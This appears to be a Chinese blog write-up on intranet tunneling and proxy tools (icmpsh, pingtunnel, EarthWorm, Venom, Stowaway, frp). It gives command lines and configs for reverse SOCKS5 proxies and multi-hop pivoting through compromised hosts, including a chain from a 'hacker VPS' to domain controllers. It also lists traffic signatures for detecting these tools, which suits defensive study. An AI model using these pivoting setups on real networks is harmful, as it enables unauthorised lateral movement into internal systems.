<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203220717587.png" alt="image-20220203220717587"></p>
<p>数据包Type字段类型为0或者8，表示请求和应答。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203220814214.png" alt="image-20220203220814214"></p>
<p>在icmpsh中，其交互过程的数据包中请求包和响应包长度明显不相同，并且Data字段内容明显为明文的敏感信息。</p>
<p>建立连接</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203230047657.png" alt="image-20220203230047657"></p>
<p>执行命令过程</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203230234454.png" alt="image-20220203230234454"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203230302457.png" alt="image-20220203230302457"></p>
<p>在pingtunnel中，明显地，单位时间内数据包的数量过大。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203231628763.png" alt="image-20220203231628763"></p>
<p>单组数据包Data字段长度非默认长度，并且请求和应答报文的长度也不相同。在单组数据包Data字段内容中，在交互过程存在会话key和明文访问信息。</p>
<p>pingtunnel在访问过程会把会话key和访问信息封装到icmp协议的data字段中。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203234059776.png" alt="image-20220203234059776"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220203234136622.png" alt="image-20220203234136622"></p>
<p>流量检测关键点：</p>
<ul>
<li>单位时间内数据包的数量</li>
<li>单组数据包Data字段长度</li>
<li>单组数据包Data字段内容</li>
</ul>
<h3 id="3、TCP隧道技术"><a href="#3、TCP隧道技术" class="headerlink" title="3、TCP隧道技术"></a>3、TCP隧道技术</h3><p><strong>EarthWorm</strong></p>
<ul>
<li><p>介绍</p>
<p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。<br>能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204004030370.png" alt="image-20220204004030370"></p>
</li>
<li><p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p>
</li>
<li><p>使用</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">EW共有6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）</span><br><span class="line">ssocksd:正向代理、rcsocks:流量转发、rssocks:socks5反弹</span><br><span class="line">lcx_slave:端口绑定、lcx_listen:流量转发、lcx_tran:端口转发</span><br><span class="line"></span><br><span class="line">lcx_slave 该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">lcx_tran 该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">lcx_listen该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。</span><br><span class="line"></span><br><span class="line">-l 为服务启动打开一个端口。</span><br><span class="line">-d 设置反弹主机地址。</span><br><span class="line">-e 设置反弹端口。</span><br><span class="line">-f 设置连接主机地址。</span><br><span class="line">-ｇ连接端口设置连接端口。</span><br><span class="line">-t 设置超时的毫秒数。默认值值是1000</span><br></pre></td></tr></table></figure>



<p>1）反向socks5代理</p>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s rssocks -d 192.168.1.131 -e 8888</span><br></pre></td></tr></table></figure>



<p>服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s rcsocks -l 1080 -e 8888 </span><br></pre></td></tr></table></figure>



<p>测试结果</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204135935468.png" alt="image-20220204135935468"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204140033714.png" alt="image-20220204140033714"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204140047325.png" alt="image-20220204140047325"></p>
<p>2）二级级联</p>
<p>获得目标网络内两台主机A(2.2.2.2)、B(2.2.2.3)的权限。</p>
<p>A主机存在公网 IP，且自由监听任意端口，无法访问特定资源。<br>B主机是目标网络内部主机，可访问特定资源，但无法访问公网。</p>
<p>A主机可直连B主机。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204150024352.png" alt="image-20220204150024352"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主机A</span><br><span class="line">ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 8888</span><br><span class="line"></span><br><span class="line">主机B</span><br><span class="line">ew -s ssocksd -l 8888</span><br><span class="line"></span><br><span class="line">通过proxifier代理工具访问2.2.2.2:1080</span><br></pre></td></tr></table></figure>



<p>主机A(2.2.2.2)、B(2.2.2.3)，公网VPS(1.1.1.1)。</p>
<p>A主机，无公网 IP，无法访问特定资源，可访问外网。</p>
<p>B主机是内部主机，可访问特定资源，却无法回连公网。</p>
<p>A主机可直连B主机。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204162548382.png" alt="image-20220204162548382"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">公网主机</span><br><span class="line">ew -s lcx_listen -e 8888 -l 1080</span><br><span class="line"></span><br><span class="line">A主机</span><br><span class="line">ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br><span class="line"></span><br><span class="line">B主机</span><br><span class="line">ew -s ssocksd -l 9999</span><br><span class="line"></span><br><span class="line">通过proxifier代理工具访问1.1.1.1:1080</span><br></pre></td></tr></table></figure>



<p>3）多级级联</p>
<p>主机A(2.2.2.2)、B(2.2.2.3)、C(2.2.2.4)，公网VPS(1.1.1.1)。</p>
<p>A主机无公网IP，无法访问特定资源，可访问外网。<br>B主机无法访问特定资源，无法回连公网。<br>C主机可访问特定资源，无法回连公网。<br>A主机可直连B主机，B主机可直连C主机。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204165342607.png" alt="image-20220204165342607"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">VPS</span><br><span class="line">ew -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line">主机A</span><br><span class="line">ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br><span class="line"></span><br><span class="line">主机Ｂ</span><br><span class="line">ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line"></span><br><span class="line">主机C</span><br><span class="line">ew -s rssocks -d 2.2.2.3 -e 7777</span><br><span class="line"></span><br><span class="line">通过proxifier代理工具访问1.1.1.1:1080</span><br></pre></td></tr></table></figure>

<p>数据流向为socks5代理-&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
<p><strong>Venom</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p>
<p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p>
<p>渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。</p>
<p>其功能特性支持：多级socks5代理、多级端口转发、端口复用 (apache&#x2F;mysql&#x2F;…)、ssh隧道、节点间通信加密</p>
<ul>
<li><p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom/">https://github.com/Dliv3/Venom/</a></p>
</li>
<li><p>使用</p>
</li>
</ul>
<p>1）未加密下的反向socks5代理</p>
<p>服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.exe -lport 9999</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204213818605.png" alt="image-20220204213818605"></p>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 192.168.1.131 -rport 9999</span><br></pre></td></tr></table></figure>

<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204213853383.png" alt="image-20220204213853383"></p>
<p>2）加密下的反向socks5代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin.exe -lport 9999 -passwd dlive@dubhe</span><br><span class="line">agent.exe -rhost 192.168.1.131 -rport 9999 -passwd dlive@dubhe</span><br></pre></td></tr></table></figure>



<p>3）多级级联</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205002512017.png" alt="image-20220205002512017"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">VPS:120.10.120.X</span><br><span class="line">admin_linux_x64 -lport 4343 -passwd test@123</span><br><span class="line">goto 1</span><br><span class="line">listen 4343</span><br><span class="line">goto 2</span><br><span class="line">listen 4343</span><br><span class="line"></span><br><span class="line">主机A:192.168.3.15</span><br><span class="line">agent.exe -rhost 120.10.120.X -rport 4343 -passwd test@123</span><br><span class="line"></span><br><span class="line">主机B:192.168.3.30</span><br><span class="line">agent.exe -rhost 192.168.3.15 -rport 4343 -passwd test@123</span><br><span class="line"></span><br><span class="line">主机C:192.168.3.160</span><br><span class="line">agent.exe -rhost 192.168.3.30 -rport 4343 -passwd test@123</span><br></pre></td></tr></table></figure>



<p><strong>Stowaway</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具。用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能。</p>
<p>其功能特性支持：节点间正向&#x2F;反向连接、节点间支持重连、节点间可通过socks5代理进行连接、节点间可通过ssh隧道连接、节点间流量可选择TCP&#x2F;HTTP、多级socks5流量代理转发,支持UDP&#x2F;TCP,IPV4&#x2F;IPV6、节点支持ssh访问远程主机、远程shell、上传及下载文件、端口本地&#x2F;远程映射、节点可端口复用、自由开关各类服务、节点间相互认证、节点间流量以AES-256-GCM进行加密。</p>
<ul>
<li><p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p>
</li>
<li><p>使用</p>
</li>
</ul>
<p>1）未加密下反向代理</p>
<p>服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stowaway_admin -l 9999</span><br><span class="line">use 0 </span><br><span class="line">socks 10001</span><br></pre></td></tr></table></figure>

<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205155352084.png" alt="image-20220205155352084"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205155408868.png" alt="image-20220205155408868"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205155502058.png" alt="image-20220205155502058"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205155536951.png" alt="image-20220205155536951"></p>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stowaway_agent -c 192.168.1.131:9999</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205155034409.png" alt="image-20220205155034409"></p>
<p>2）加密下反向代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stowaway_admin -l 9999 -s test@123</span><br><span class="line">stowaway_agent -c 192.168.1.131:9999 -s test@123</span><br></pre></td></tr></table></figure>



<p>3）多级级联</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在stowaway中，组成多级网络需要借助admin中的listen、connect、 sshtunnel命令来实现</span><br><span class="line"></span><br><span class="line">admin: </span><br><span class="line">./stowaway_admin -l 9999 -s 123</span><br><span class="line"></span><br><span class="line">agent-1: </span><br><span class="line">./stowaway_agent -c 127.0.0.1:9999 -s 123</span><br><span class="line"></span><br><span class="line">agent-2: </span><br><span class="line">./stowaway_agent -l 10000 -s 123</span><br><span class="line">通过admin,输入use 0 -&gt; connect agent-2的IP:10000来将其加入网络，并成为agent-1的一个子节点</span><br><span class="line"></span><br><span class="line">agent-3: </span><br><span class="line">./stowaway_agent -c 127.0.0.1:10001 -s 123</span><br><span class="line">通过admin,输入use 0 -&gt; listen -&gt; 选择1.Normal Passive -&gt; 输入10001 从而使得agent-1监听在10001端口上，并等待子节点的连接</span><br></pre></td></tr></table></figure>



<p><strong>Frp</strong></p>
<ul>
<li>介绍</li>
</ul>
<p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p>
<p>其功能特性支持：支持 TCP、KCP 以及 Websocket 等多种协议;采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间;代理组间的负载均衡;端口复用，多个服务通过同一个服务端端口暴露;多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等）。</p>
<ul>
<li><p>下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
</li>
<li><p>使用</p>
</li>
</ul>
<p>1）正常使用</p>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.131</span><br><span class="line">server_port = 7000</span><br><span class="line">token = test@123</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.73</span><br><span class="line">remote_port = 1081</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = 123</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = test@123</span><br></pre></td></tr></table></figure>



<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205174049800.png" alt="image-20220205174049800"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205171340966.png" alt="image-20220205171340966"></p>
<p>2）多级级联</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205165513019.png" alt="image-20220205165513019"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1、黑客VPS</span><br><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7099</span><br><span class="line"></span><br><span class="line">2、外网web服务器</span><br><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.27.157</span><br><span class="line">server_port = 7000</span><br><span class="line">[proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 10.10.3.100</span><br><span class="line">local_port = 9999</span><br><span class="line">remote_port = 9999</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line">#frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.3.100</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line">3、内网域控</span><br><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.3.100</span><br><span class="line">server_port = 7000</span><br><span class="line">[proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 10.10.21.5</span><br><span class="line">local_port = 9999</span><br><span class="line">remote_port = 9999</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line">#frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.21.5</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line">4、财务子域控制器</span><br><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.21.5</span><br><span class="line">server_port = 7000</span><br><span class="line">[proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 9999</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<p>最后通过proxifier将流量带入内网</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205165808196.png" alt="image-20220205165808196"></p>
<h3 id="4、TCP隧道流量特征"><a href="#4、TCP隧道流量特征" class="headerlink" title="4、TCP隧道流量特征"></a>4、TCP隧道流量特征</h3><p><strong>EarthWorm</strong></p>
<p>ew在建立连接的过程中，数据包存在额外的数据特征“xx xx 00 00 00 00”</p>
<p>客户端发送“01 01 00 00 00 00”</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204175113004.png" alt="image-20220204175113004"></p>
<p>服务端应答“01 02 00 00 00 00”，建立连接。</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204175134287.png" alt="image-20220204175134287"></p>
<p><strong>Venom</strong></p>
<p>未加密下venom在建立连接过程的过程中会先发起系列”00 00 00 00 00 00“</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204221533181.png" alt="image-20220204221533181"></p>
<p>接着通过携带“ABCDEFGH”，来判断是否为venom协议</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204221603757.png" alt="image-20220204221603757"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204221625642.png" alt="image-20220204221625642"></p>
<p>同时，通过携带“VCMD”，作为协议的数据分割</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204221800953.png" alt="image-20220204221800953"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204221731333.png" alt="image-20220204221731333"></p>
<p>执行命令过程也为明文信息</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204222312429.png" alt="image-20220204222312429"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220204222339869.png" alt="image-20220204222339869"></p>
<p>使用venom的加密下，只存在较小的特征，如携带的数据全置零</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205000547247.png" alt="image-20220205000547247"></p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205000934101.png" alt="image-20220205000934101"></p>
<p>推测，其在只有在不使用端口复用时候，才存在</p>
<p><img src="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220205001101898.png" alt="image-20220205001101898"></p>
<p><strong>Stowaway</strong></p>
<p>加密和未加密情况下，除了部分数据加密外，特征并没有发生变化。</p>
<p>stowaway在建立连接过程的过程中客户端会先发起系列”00 00 00 00 00 00“</p>
